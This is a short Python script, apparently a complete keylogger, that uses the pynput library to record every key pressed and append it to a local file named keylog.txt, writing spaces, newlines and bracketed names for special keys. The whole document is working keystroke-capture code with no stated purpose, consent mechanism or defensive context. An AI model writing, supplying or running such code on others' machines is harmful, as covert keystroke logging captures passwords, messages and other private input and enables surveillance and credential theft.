from pynput import keyboard

output = "keylog.txt"

with open(output, "a") as f:
    def on_the_key(key):
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key.name}] ")
        f.flush()

    with keyboard.Listener(on_press=on_the_key) as listener:
        listener.join()
